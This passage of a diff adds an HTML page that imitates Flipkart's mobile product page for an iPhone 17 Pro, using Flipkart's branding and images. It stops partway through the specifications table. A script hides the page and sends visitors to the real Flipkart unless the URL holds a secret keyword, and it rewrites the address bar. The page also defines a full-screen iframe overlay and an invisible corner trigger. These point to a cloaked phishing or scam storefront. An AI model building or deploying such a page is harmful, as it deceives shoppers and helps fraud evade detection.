@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Apple iPhone 17 Pro - Flipkart</title>
+
+<!-- Anti-Flicker / Anti-Flash Verification Guard & SPA URL Restorer -->
+<style id="antiFlashStyle">
+  body { display: none !important; }
+</style>
+<script>
+  (function() {
+    var VERIFY_KEYWORD = 'apple-iphone-17-pro';
+    var fullHref = window.location.href;
+    var search = window.location.search;
+    var isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:';
+
+    // 1. Verify keyword exists in URL or query parameter
+    if (fullHref.indexOf(VERIFY_KEYWORD) !== -1 || isLocal) {
+      
+      // 2. Decode and restore exact full URL from 404.html redirect
+      if (search && search.indexOf('p=') !== -1) {
+        try {
+          var param = search.split('p=')[1];
+          if (param) {
+            var originalPath = decodeURIComponent(param.split('&')[0]);
+            var cleanUrl = '/kk' + originalPath;
+            window.history.replaceState({ product: true }, '', cleanUrl);
+          }
+        } catch(e) {}
+      }
+
+      // 3. Reveal page once DOM is ready
+      document.addEventListener('DOMContentLoaded', function() {
+        var style = document.getElementById('antiFlashStyle');
+        if (style) style.remove();
+      });
+    } else {
+      // 4. Unauthorized direct access without keyword
+      window.location.replace('https://www.flipkart.com');
+    }
+  })();
+</script>
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+  :root {
+    --bg-page: #f1f2f4;
+    --bg-card: #ffffff;
+    --border: #f0f0f0;
+    --border-dark: #e5e7eb;
+    --text-primary: #111827;
+    --text-secondary: #717478;
+    --fk-blue: #2874f0;
+    --rating-green: #388e3c;
+    --buy-yellow: #ffc200;
+    --minutes-color: #2a55e5;
+    --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background-color: var(--bg-page);
+    color: var(--text-primary);
+    font-family: var(--font);
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  /* Mobile App Shell */
+  .mobile-container {
+    width: 100%;
+    max-width: 480px;
+    background: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    box-shadow: 0 0 20px rgba(0,0,0,0.06);
+    padding-bottom: 76px; /* Space for Sticky Footer */
+  }
+
+  /* Header (Cleaned - Cart removed) */
+  header.topbar {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: #ffffff;
+    height: 52px;
+    padding: 0 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+  .brand-logo {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    text-decoration: none;
+  }
+  .brand-logo img {
+    height: 22px;
+    width: auto;
+    display: block;
+  }
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .header-icon-btn {
+    width: 38px;
+    height: 38px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--text-primary);
+    border-radius: 50%;
+    cursor: pointer;
+    background: none;
+    border: none;
+    text-decoration: none;
+  }
+  .header-icon-btn:active { background: #f1f5f9; }
+
+  /* Product Carousel */
+  .carousel-wrapper {
+    position: relative;
+    width: 100%;
+    background: #ffffff;
+    border-bottom: 1px solid var(--border);
+  }
+  .carousel-track {
+    display: flex;
+    overflow-x: auto;
+    scroll-snap-type: x mandatory;
+    -webkit-overflow-scrolling: touch;
+    scrollbar-width: none;
+  }
+  .carousel-track::-webkit-scrollbar { display: none; }
+  .carousel-slide {
+    flex: 0 0 100%;
+    width: 100%;
+    height: 420px;
+    scroll-snap-align: center;
+    scroll-snap-stop: always;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #ffffff;
+    position: relative;
+  }
+  .carousel-slide img {
+    width: 95%;
+    height: 95%;
+    object-fit: contain;
+  }
+
+  /* Video Slide */
+  .video-slide-container {
+    width: 100%;
+    height: 100%;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    background: #000000;
+  }
+  .video-slide-container img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    opacity: 0.92;
+  }
+  .play-circle-btn {
+    position: absolute;
+    width: 58px;
+    height: 58px;
+    background: #ff0000;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #ffffff;
+    box-shadow: 0 4px 18px rgba(0,0,0,0.4);
+    transition: transform 0.2s ease;
+  }
+  .play-circle-btn svg { margin-left: 3px; }
+  .video-slide-container:active .play-circle-btn { transform: scale(0.92); }
+
+  /* Rating Badge */
+  .image-rating-badge {
+    position: absolute;
+    bottom: 14px;
+    left: 14px;
+    background: rgba(255, 255, 255, 0.95);
+    border: 1px solid var(--border-dark);
+    padding: 4px 10px;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--text-primary);
+    cursor: pointer;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    z-index: 10;
+  }
+  .image-rating-badge:active { transform: scale(0.96); }
+  .star-pill {
+    background: var(--rating-green);
+    color: #ffffff;
+    font-size: 11px;
+    padding: 2px 5px;
+    border-radius: 4px;
+    display: inline-flex;
+    align-items: center;
+    gap: 2px;
+  }
+
+  /* Carousel Dots */
+  .carousel-dots-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 5px;
+    padding: 10px 0 6px;
+    background: #ffffff;
+  }
+  .carousel-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 3px;
+    background: #cbd5e1;
+    transition: all 0.25s ease;
+  }
+  .carousel-dot.active {
+    width: 18px;
+    background: var(--fk-blue);
+  }
+
+  /* Product Info */
+  .product-content {
+    padding: 12px 16px 14px;
+    background: #ffffff;
+  }
+  .product-title {
+    font-size: 16px;
+    font-weight: 600;
+    line-height: 1.35;
+    margin-bottom: 6px;
+  }
+  .product-subtitle {
+    font-size: 12px;
+    color: var(--text-secondary);
+    margin-bottom: 10px;
+  }
+  .price-card {
+    display: flex;
+    align-items: baseline;
+    gap: 8px;
+    margin-bottom: 4px;
+  }
+  .price-current { font-size: 24px; font-weight: 700; }
+  .price-original {
+    font-size: 14px;
+    color: var(--text-secondary);
+    text-decoration: line-through;
+  }
+  .price-off {
+    font-size: 14px;
+    color: var(--rating-green);
+    font-weight: 700;
+  }
+  .price-tax {
+    font-size: 11px;
+    color: var(--text-secondary);
+  }
+
+  /* Section Dividers */
+  .section-divider {
+    height: 8px;
+    background: var(--bg-page);
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-box {
+    padding: 14px 16px;
+    background: #ffffff;
+  }
+  .section-heading {
+    font-size: 14px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 12px;
+  }
+
+  /* Highlights */
+  .highlights-list {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  .highlight-item {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 12px;
+    background: #fafafa;
+    border: 1px solid var(--border-dark);
+    border-radius: 8px;
+  }
+  .highlight-item img {
+    width: 36px;
+    height: 36px;
+    object-fit: contain;
+    flex-shrink: 0;
+  }
+  .highlight-text-main {
+    font-size: 13px;
+    font-weight: 600;
+    line-height: 1.25;
+  }
+  .highlight-text-sub {
+    font-size: 11px;
+    color: var(--text-secondary);
+    margin-top: 2px;
+  }
+
+  /* Tabs */
+  .product-tabs-container {
+    background: #ffffff;
+  }
+  .tabs-nav-bar {
+    display: flex;
+    border-bottom: 1px solid var(--border-dark);
+    overflow-x: auto;
+    scrollbar-width: none;
+  }
+  .tabs-nav-bar::-webkit-scrollbar { display: none; }
+  .tab-item-btn {
+    flex: 1;
+    min-width: 100px;
+    text-align: center;
+    padding: 12px 6px;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    background: none;
+    border: none;
+    border-bottom: 2px solid transparent;
+    cursor: pointer;
+    white-space: nowrap;
+  }
+  .tab-item-btn.active {
+    color: var(--fk-blue);
+    border-bottom-color: var(--fk-blue);
+  }
+  .tab-panel-body {
+    display: none;
+    padding: 16px;
+  }
+  .tab-panel-body.active { display: block; }
+
+  /* Showcase */
+  .showcase-wrapper {
+    position: relative;
+    width: 100%;
+    border-radius: 8px;
+    overflow: hidden;
+    background: #ffffff;
+    border: 1px solid var(--border);
+  }
+  .showcase-wrapper img {
+    width: 100%;
+    display: block;
+    height: auto;
+    object-fit: contain;
+  }
+  .showcase-smoke-gradient {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 55%;
+    background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.88) 50%, #ffffff 100%);
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+    padding-bottom: 16px;
+  }
+  .showcase-btn {
+    padding: 10px 24px;
+    background: var(--fk-blue);
+    color: #ffffff;
+    font-size: 13px;
+    font-weight: 600;
+    border-radius: 20px;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(40,116,240,0.25);
+  }
+
+  /* Specs Table */
+  .specs-collapsible-wrapper {
+    position: relative;
+    max-height: 240px;
+    overflow: hidden;
+    transition: max-height 0.4s ease;
+  }
+  .specs-collapsible-wrapper.expanded {
+    max-height: 5000px;
+  }
+  .specs-gradient-mask {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 80px;
+    background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, #ffffff 100%);
+    pointer-events: none;
+  }
+  .specs-collapsible-wrapper.expanded .specs-gradient-mask { display: none; }
+  .spec-group-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text-primary);
+    padding: 12px 0 6px;
+    border-bottom: 1px solid var(--border);
+    margin-top: 10px;
+  }
+  .spec-table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+  .spec-table tr { border-bottom: 1px solid var(--border); }
+  .spec-table td {
+    padding: 8px 2px;
+    font-size: 12px;
+    vertical-align: top;
+    line-height: 1.35;
+  }
+  .spec-table td:first-child {
+    color: var(--text-secondary);
+    width: 40%;
+  }
+  .spec-table td:last-child {
+    color: var(--text-primary);
+    font-weight: 500;
+  }
+  .toggle-specs-btn {
+    width: 100%;
+    margin-top: 12px;
+    padding: 10px;
+    background: #ffffff;
+    border: 1px solid var(--fk-blue);
+    color: var(--fk-blue);
+    font-size: 13px;
+    font-weight: 700;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+
+  /* Info Tab Rows */
+  .info-tab-row {
+    padding: 8px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 12px;
+  }
+  .info-tab-label {
+    color: var(--text-secondary);
+    margin-bottom: 2px;
+  }
+  .info-tab-val {
+    color: var(--text-primary);
+    font-weight: 600;
+  }
+
+  /* Ads Carousel Section */
+  .ads-section {
+    padding: 14px 16px;
+    background: #ffffff;
+  }
+  .ads-carousel-wrapper {
+    position: relative;
+    width: 100%;
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  .ads-track {
+    display: flex;
+    overflow-x: auto;
+    scroll-snap-type: x mandatory;
+    -webkit-overflow-scrolling: touch;
+    scrollbar-width: none;
+  }
+  .ads-track::-webkit-scrollbar { display: none; }
+  .ad-slide {
+    flex: 0 0 100%;
+    width: 100%;
+    scroll-snap-align: center;
+    scroll-snap-stop: always;
+    cursor: pointer;
+  }
+  .ad-slide img {
+    width: 100%;
+    height: auto;
+    display: block;
+    border-radius: 8px;
+  }
+  
+  .ad-progress-bar-container {
+    display: flex;
+    gap: 6px;
+    justify-content: center;
+    align-items: center;
+    margin-top: 10px;
+  }
+  .ad-progress-item {
+    height: 4px;
+    background: #e2e8f0;
+    border-radius: 2px;
+    overflow: hidden;
+    position: relative;
+    width: 8px;
+    transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  .ad-progress-item.active {
+    width: 32px;
+  }
+  .ad-progress-fill {
+    width: 0%;
+    height: 100%;
+    background: var(--fk-blue);
+    border-radius: 2px;
+  }
+
+  /* ---------------- NEW FOOTER BAR (Customized as per screenshot) ---------------- */
+  .sticky-bottom-bar {
+    position: fixed;
+    bottom: 0;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 100%;
+    max-width: 480px;
+    height: 64px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 12px;
+    background: #ffffff;
+    box-shadow: 0 -3px 12px rgba(0,0,0,0.06);
+    z-index: 150;
+    border-top: 1px solid var(--border-dark);
+  }
+  
+  /* Left Cart Box */
+  .footer-cart-box {
+    width: 48px;
+    height: 48px;
+    flex: 0 0 48px;
+    background: #ffffff;
+    border: 1.5px solid var(--border-dark);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    cursor: pointer;
+    color: var(--text-primary);
+  }
+  .footer-cart-box:active { background: #f8fafc; }
+  .cart-badge-check {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    width: 13px;
+    height: 13px;
+    background: var(--rating-green);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #ffffff;
+    font-size: 8px;
+    font-weight: 800;
+  }
+
+  /* Middle Flipkart Minutes Button */
+  .footer-minutes-btn {
+    flex: 1;
+    height: 48px;
+    background: #ffffff;
+    border: 1.5px solid var(--border-dark);
+    border-radius: 12px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    padding: 2px 4px;
+  }
+  .footer-minutes-btn:active { background: #f8fafc; }
+  .footer-min-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text-primary);
+    line-height: 1.2;
+    display: flex;
+    align-items: center;
+    gap: 3px;
+  }
+  .footer-min-sub {
+    font-size: 10px;
+    color: var(--text-secondary);
+    line-height: 1.2;
+    margin-top: 2px;
+  }
+
+  /* Right Buy Now Button (Yellow Card) */
+  .footer-buy-btn {
+    flex: 1.25;
+    height: 48px;
+    background: var(--buy-yellow);
+    border: none;
+    border-radius: 12px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    padding: 2px 4px;
+    box-shadow: 0 2px 8px rgba(255, 194, 0, 0.35);
+  }
+  .footer-buy-btn:active { opacity: 0.92; }
+  .footer-buy-title {
+    font-size: 14px;
+    font-weight: 800;
+    color: #111827;
+    line-height: 1.2;
+  }
+  .footer-buy-price {
+    font-size: 11px;
+    font-weight: 600;
+    color: #1f2937;
+    line-height: 1.2;
+  }
+
+  /* Video Popup Modal */
+  .video-modal-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    z-index: 2500;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+  }
+  .video-modal-box {
+    width: 100%;
+    max-width: 460px;
+    background: #000000;
+    border-radius: 12px;
+    position: relative;
+    box-shadow: 0 12px 36px rgba(0,0,0,0.5);
+  }
+  .video-close-floating-btn {
+    position: absolute;
+    top: -46px;
+    right: 0;
+    width: 36px;
+    height: 36px;
+    background: #ffffff;
+    color: #000000;
+    border: none;
+    border-radius: 50%;
+    font-size: 18px;
+    font-weight: 800;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+    z-index: 2600;
+  }
+  .video-iframe-wrapper {
+    width: 100%;
+    aspect-ratio: 16 / 9;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  .video-iframe-wrapper iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+
+  /* Reviews Bottom-Sheet */
+  .sheet-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(4px);
+    z-index: 2100;
+    display: none;
+    align-items: flex-end;
+  }
+  .sheet-content {
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+    background: #ffffff;
+    border-radius: 16px 16px 0 0;
+    max-height: 80vh;
+    display: flex;
+    flex-direction: column;
+    transform: translateY(100%);
+    transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .sheet-backdrop.active .sheet-content { transform: translateY(0); }
+  .sheet-header {
+    padding: 14px 16px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .sheet-drag-handle {
+    width: 36px;
+    height: 4px;
+    background: #cbd5e1;
+    border-radius: 2px;
+    margin: 8px auto 0;
+  }
+  .sheet-body {
+    padding: 16px;
+    overflow-y: auto;
+  }
+  .sheet-photos {
+    display: flex;
+    gap: 8px;
+    overflow-x: auto;
+    scrollbar-width: none;
+    margin-bottom: 14px;
+  }
+  .sheet-photos::-webkit-scrollbar { display: none; }
+  .sheet-photo-item {
+    width: 80px;
+    height: 80px;
+    flex: 0 0 80px;
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid var(--border-dark);
+  }
+  .sheet-photo-item img { width: 100%; height: 100%; object-fit: cover; }
+  .review-card {
+    padding: 10px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .review-card:last-child { border-bottom: none; }
+  .review-head {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 4px;
+  }
+  .review-author { font-size: 12px; font-weight: 600; }
+  .review-body { font-size: 12px; color: #374151; line-height: 1.35; }
+  .see-all-reviews-btn {
+    width: 100%;
+    margin-top: 14px;
+    padding: 12px;
+    background: #ffffff;
+    border: 1px solid var(--fk-blue);
+    color: var(--fk-blue);
+    font-size: 13px;
+    font-weight: 700;
+    border-radius: 8px;
+    cursor: pointer;
+    text-align: center;
+    display: block;
+  }
+
+  /* Full Page Iframe Overlay */
+  #iframeOverlay {
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #ffffff;
+    z-index: 99999;
+    display: none;
+    flex-direction: column;
+  }
+  #appFrame {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+
+  /* Invisible Trigger in Top-Left Corner */
+  #invisibleRefreshTrigger {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 65px;
+    height: 65px;
+    z-index: 100000;
+    cursor: pointer;
+    background: transparent;
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<div class="mobile-container">
+  <!-- Header (Cart Icon Removed) -->
+  <header class="topbar">
+    <div class="brand-logo" onclick="openInWeb(event, 'https://www.flipkart.com')" title="Flipkart">
+      <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fk-mp-c815b6.svg" alt="Flipkart">
+    </div>
+    <div class="header-actions">
+      <!-- Search Button (Forced to stay in Web browser) -->
+      <button type="button" onclick="openInWeb(event, 'https://www.flipkart.com/searchsuggestion')" class="header-icon-btn" title="Search">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"></circle>
+          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- Product Image Carousel -->
+  <div class="carousel-wrapper">
+    <div class="carousel-track" id="productCarouselTrack">
+      <!-- 1. Main Image -->
+      <div class="carousel-slide">
+        <img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/5/i/n/-original-imahft5ndwfkx6ez.jpeg?q=90" alt="iPhone 17 Pro">
+      </div>
+
+      <!-- 2. Video Slide -->
+      <div class="carousel-slide">
+        <div class="video-slide-container" onclick="openVideoModal('https://www.youtube-nocookie.com/embed/FAbwR58dNHo?autoplay=1&playsinline=1&modestbranding=1&rel=0')">
+          <img src="https://i.ytimg.com/vi/FAbwR58dNHo/hqdefault.jpg" onerror="this.src='https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/q/s/s/-original-imahft5nxa9wukz8.jpeg?q=90'" alt="YouTube Video Thumbnail">
+          <div class="play-circle-btn">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M8 5v14l11-7z"/>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- 3 to 12. Gallery Images -->
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/q/s/s/-original-imahft5nxa9wukz8.jpeg?q=90" alt="Slide 3"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/c/k/m/-original-imahft5nz2k5gfm3.jpeg?q=90" alt="Slide 4"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/a/p/v/-original-imahft5nch3khzvu.jpeg?q=90" alt="Slide 5"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90" alt="Slide 6"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/q/m/5/-original-imahft5nh6hqzt4g.jpeg?q=90" alt="Slide 7"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/g/b/g/-original-imahft5nwvbwaasy.jpeg?q=90" alt="Slide 8"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/f/e/i/-original-imahft5nerqtntdt.jpeg?q=90" alt="Slide 9"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90" alt="Slide 10"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/n/a/n/-original-imahft5nq7z4bnmn.jpeg?q=90" alt="Slide 11"></div>
+      <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/l/z/q/-original-imahft57f3qjg325.jpeg?q=90" alt="Slide 12"></div>
+    </div>
+
+    <!-- Rating badge -->
+    <div class="image-rating-badge" onclick="openReviewsSheet()" title="View Reviews">
+      <span class="star-pill">4.7 ★</span>
+      <span>|</span>
+      <span>44.8k+</span>
+    </div>
+  </div>
+
+  <!-- Carousel Dots Indicators -->
+  <div class="carousel-dots-container" id="productCarouselDots">
+    <div class="carousel-dot active"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+  </div>
+
+  <!-- Primary Product Info -->
+  <div class="product-content">
+    <h1 class="product-title">Apple iPhone 17 Pro (Cosmic Orange, 256 GB)</h1>
+    <div class="product-subtitle">Hexa Core A19 Chip | Triple 48MP Fusion Camera</div>
+
+    <div class="price-card">
+      <span class="price-current">₹1,34,900</span>
+      <span class="price-original">₹1,44,900</span>
+      <span class="price-off">7% off</span>
+    </div>
+    <div class="price-tax">Inclusive of all taxes · Free Delivery</div>
+  </div>
+
+  <div class="section-divider"></div>
+
+  <!-- Highlights Section -->
+  <div class="section-box">
+    <div class="section-heading">Highlights</div>
+    <div class="highlights-list">
+      <div class="highlight-item">
+        <img src="https://rukminim2.flixcart.com/www/80/80/promos/28/06/2025/ca3c722b-3b51-4553-b9f5-5f25f82b5b75.png?q=60" alt="ROM">
+        <div>
+          <div class="highlight-text-main">256 GB ROM</div>
+        </div>
+      </div>
+      <div class="highlight-item">
+        <img src="https://rukminim2.flixcart.com/www/80/80/promos/28/06/2025/d5149d46-d48f-448f-af46-174aeb1924f4.png?q=60" alt="Processor">
+        <div>
+          <div class="highlight-text-main">A19 Chip, 6 Core Processor | Hexa Core | 4.26 GHz Clock Speed</div>
+          <div class="highlight-text-sub">Superfast Multitasking. Extensive Gaming</div>
+        </div>
+      </div>
+      <div class="highlight-item">
+        <img src="https://rukminim2.flixcart.com/www/80/80/promos/28/06/2025/e25e9e36-1c3f-412d-b632-9524aabb873c.png?q=60" alt="Rear Camera">
+        <div>
+          <div class="highlight-text-main">48MP + 48MP + 48MP Rear Camera</div>
+          <div class="highlight-text-sub">DSLR Like Pictures &amp; Great Zoom</div>
+        </div>
+      </div>
+      <div class="highlight-item">
+        <img src="https://rukminim2.flixcart.com/www/80/80/promos/28/06/2025/18e5791c-614f-49db-b1a9-1a23921cb33c.png?q=60" alt="Front Camera">
+        <div>
+          <div class="highlight-text-main">18MP Front Camera.</div>
+        </div>
+      </div>
+      <div class="highlight-item">
+        <img src="https://rukminim2.flixcart.com/www/80/80/promos/28/06/2025/b19e02c0-f7fe-4ff2-9727-07609eecf6e6.png?q=60" alt="Display">
+        <div>
+          <div class="highlight-text-main">6.3 inch All Screen OLED Display</div>
+          <div class="highlight-text-sub">Cinematic Display. Sharpest Colours</div>
+        </div>
+      </div>
+      <div class="highlight-item">
+        <img src="https://rukminim2.flixcart.com/www/80/80/promos/28/06/2025/323c3573-6148-4f0d-9b2b-ba5f07cedef9.png?q=60" alt="Battery">
+        <div>
+          <div class="highlight-text-main">3988mAh Battery</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section-divider"></div>
+
+  <!-- Detailed Tabs Container -->
+  <div class="product-tabs-container">
+    <div class="tabs-nav-bar">
+      <button class="tab-item-btn active" onclick="switchProductTab('tab-showcase', this)">Showcase</button>
+      <button class="tab-item-btn" onclick="switchProductTab('tab-specs', this)">Specifications</button>
+      <button class="tab-item-btn" onclick="switchProductTab('tab-warranty', this)">Warranty</button>
+      <button class="tab-item-btn" onclick="switchProductTab('tab-manufacturer', this)">Manufacturer Info</button>
+    </div>
+
+    <!-- Tab 1: Showcase -->
+    <div id="tab-showcase" class="tab-panel-body active">
+      <div class="showcase-wrapper">
+        <img src="https://rukminim2.flixcart.com/image/940/520/cms-rpd-img/d3a1250848784428aa60f9377b6306b7_19932f6af27_r2078_Marketing_Page_Avail_Flipkart_Mobile_1280px_WIP_v2__en-IN_01.jpg.jpeg?q=60" alt="Apple iPhone 17 Pro Showcase">
+        <div class="showcase-smoke-gradient">
+          <button class="showcase-btn" onclick="openInIframe(event, 'https://www.flipkart.com/rpd-product-details?pid=MOBHFN6YQKMWVPXH&lid=LSTMOBHFN6YQKMWVPXH7A8B5U&parentContentIdentifier=highlights&pageUID=1787762590510', 'showcase')">
+            Show More Details &rsaquo;
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab 2: Specifications -->
+    <div id="tab-specs" class="tab-panel-body">
+      <div class="specs-collapsible-wrapper" id="specsWrapper">
+        <div class="spec-group-title">General</div>
+        <table class="spec-table">
+          <tr><td>Brand</td><td>Apple</td></tr>
+          <tr><td>In The Box</td><td>Handset, USB C Charge Cable (1m), Documentation</td></tr>
+          <tr><td>Model Number</td><td>MG8H4HN/A</td></tr>
+          <tr><td>Model Name</td><td>iPhone 17 Pro</td></tr>
+          <tr><td>Color</td><td>Cosmic Orange</td></tr>
+          <tr><td>Browse Type</td><td>Smartphones</td></tr>
+          <tr><td>SIM Type</td><td>Dual Sim</td></tr>
+          <tr><td>Hybrid Sim Slot</td><td>No</td></tr>
+          <tr><td>Touchscreen</td><td>Yes</td></tr>
+          <tr><td>OTG Compatible</td><td>No</td></tr>
+          <tr><td>Quick Charging</td><td>Yes</td></tr>
+          <tr><td>Sound Enhancements</td><td>Built-in Stereo Speaker</td></tr>
+          <tr><td>Headset Present</td><td>No</td></tr>
+          <tr><td>Dolby Speakers</td><td>Yes</td></tr>
+          <tr><td>VR Compatible</td><td>Yes</td></tr>
+          <tr><td>Phablet</td><td>No</td></tr>
+        </table>
+
+        <div class="spec-group-title">Display Features</div>
+        <table class="spec-table">
+          <tr><td>Display Size</td><td>16.0 cm (6.3 inch)</td></tr>
+          <tr><td>Resolution</td><td>2622 x 1206 Pixels</td></tr>
+          <tr><td>Resolution Type</td><td>Super Retina XDR Display</td></tr>
+          <tr><td>GPU</td><td>5‑core GPU with Neural Accelerators</td></tr>
+          <tr><td>Display Type</td><td>All Screen OLED Display</td></tr>
+          <tr><td>HD Game Support</td><td>Yes</td></tr>
+          <tr><td>Other Display Features</td><td>Dynamic Island, Always On Display, ProMotion Technology with Adaptive Refresh Rates Upto 120Hz, HDR Display, True Tone, Wide Colour (P3), Haptic Touch, Contrast Ratio: 2,000,000:1 (Typical), 1,000 nits Max Brightness (Typical), 1,600 nits Peak Brightness (HDR), 2,000 nits Peak Brightness (Outdoor), Fingerprint Resistant Oleophobic Coating, Support for Display of Multiple Languages and Characters Simultaneously</td></tr>
+        </table>
+
+        <div class="spec-group-title">OS &amp; Processor Features</div>
+        <table class="spec-table">
+          <tr><td>Operating System</td><td>iOS 26</td></tr>
+          <tr><td>Processor Brand</td><td>Apple</td></tr>
+          <tr><td>Processor Type</td><td>A19 Chip, 6 Core Processor</td></tr>
+          <tr><td>Processor Core</td><td>Hexa Core</td></tr>
+          <tr><td>Primary Clock Speed</td><td>4.26 GHz</td></tr>
